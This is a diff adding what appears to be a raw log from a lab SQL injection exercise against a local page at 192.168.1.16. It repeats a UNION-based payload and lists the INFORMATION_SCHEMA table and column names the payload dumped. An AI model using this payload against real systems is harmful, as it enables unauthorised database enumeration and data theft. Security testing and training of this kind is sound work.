@@ -1,0 +1,2748 @@
+http://192.168.1.16/?page=member
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: one
+Surname : me
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CHARACTER_SETS
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CHARACTER_SETS
+Surname : DEFAULT_COLLATE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CHARACTER_SETS
+Surname : DESCRIPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CHARACTER_SETS
+Surname : MAXLEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : CLIENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : TOTAL_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : CONCURRENT_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : CONNECTED_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : BUSY_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : CPU_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : BYTES_RECEIVED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : BYTES_SENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : BINLOG_BYTES_WRITTEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROWS_READ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROWS_SENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROWS_DELETED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROWS_INSERTED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROWS_UPDATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : SELECT_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : UPDATE_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : OTHER_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : COMMIT_TRANSACTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ROLLBACK_TRANSACTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : DENIED_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : LOST_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : ACCESS_DENIED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: CLIENT_STATISTICS
+Surname : EMPTY_QUERIES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : IS_DEFAULT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : IS_COMPILED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATIONS
+Surname : SORTLEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATION_CHARACTER_SET_APPLICABILITY
+Surname : COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLLATION_CHARACTER_SET_APPLICABILITY
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLUMN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : ORDINAL_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLUMN_DEFAULT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : IS_NULLABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : DATA_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : CHARACTER_MAXIMUM_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : CHARACTER_OCTET_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : NUMERIC_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : NUMERIC_SCALE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : DATETIME_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLUMN_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLUMN_KEY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : EXTRA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : PRIVILEGES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMNS
+Surname : COLUMN_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : GRANTEE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : COLUMN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : PRIVILEGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: COLUMN_PRIVILEGES
+Surname : IS_GRANTABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : ENGINE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : SUPPORT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : TRANSACTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : XA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ENGINES
+Surname : SAVEPOINTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : DEFINER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : TIME_ZONE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_BODY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_DEFINITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EXECUTE_AT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : INTERVAL_VALUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : INTERVAL_FIELD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : SQL_MODE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : STARTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : ENDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : STATUS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : ON_COMPLETION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : CREATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : LAST_ALTERED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : LAST_EXECUTED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : EVENT_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : ORIGINATOR
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : CHARACTER_SET_CLIENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : COLLATION_CONNECTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: EVENTS
+Surname : DATABASE_COLLATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : FILE_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : FILE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : FILE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TABLESPACE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : LOGFILE_GROUP_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : LOGFILE_GROUP_NUMBER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : ENGINE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : FULLTEXT_KEYS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : DELETED_ROWS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : UPDATE_COUNT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : FREE_EXTENTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TOTAL_EXTENTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : EXTENT_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : INITIAL_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : MAXIMUM_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : AUTOEXTEND_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : CREATION_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : LAST_UPDATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : LAST_ACCESS_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : RECOVER_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TRANSACTION_COUNTER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : ROW_FORMAT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : TABLE_ROWS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : AVG_ROW_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : MAX_DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : INDEX_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : DATA_FREE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : CREATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : UPDATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : CHECK_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : CHECKSUM
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : STATUS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: FILES
+Surname : EXTRA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: GLOBAL_STATUS
+Surname : VARIABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: GLOBAL_STATUS
+Surname : VARIABLE_VALUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: GLOBAL_VARIABLES
+Surname : VARIABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: GLOBAL_VARIABLES
+Surname : VARIABLE_VALUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INDEX_STATISTICS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INDEX_STATISTICS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INDEX_STATISTICS
+Surname : INDEX_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INDEX_STATISTICS
+Surname : ROWS_READ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : KEY_CACHE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : SEGMENTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : SEGMENT_NUMBER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : FULL_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : BLOCK_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : USED_BLOCKS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : UNUSED_BLOCKS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : DIRTY_BLOCKS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : READ_REQUESTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : READS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : WRITE_REQUESTS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_CACHES
+Surname : WRITES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : CONSTRAINT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : CONSTRAINT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : CONSTRAINT_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : COLUMN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : ORDINAL_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : POSITION_IN_UNIQUE_CONSTRAINT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : REFERENCED_TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : REFERENCED_TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: KEY_COLUMN_USAGE
+Surname : REFERENCED_COLUMN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : SPECIFIC_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : SPECIFIC_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : SPECIFIC_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : ORDINAL_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : PARAMETER_MODE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : PARAMETER_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : DATA_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : CHARACTER_MAXIMUM_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : CHARACTER_OCTET_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : NUMERIC_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : NUMERIC_SCALE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : DATETIME_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : DTD_IDENTIFIER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARAMETERS
+Surname : ROUTINE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : SUBPARTITION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_ORDINAL_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : SUBPARTITION_ORDINAL_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_METHOD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : SUBPARTITION_METHOD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_EXPRESSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : SUBPARTITION_EXPRESSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_DESCRIPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : TABLE_ROWS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : AVG_ROW_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : MAX_DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : INDEX_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : DATA_FREE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : CREATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : UPDATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : CHECK_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : CHECKSUM
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : PARTITION_COMMENT
+
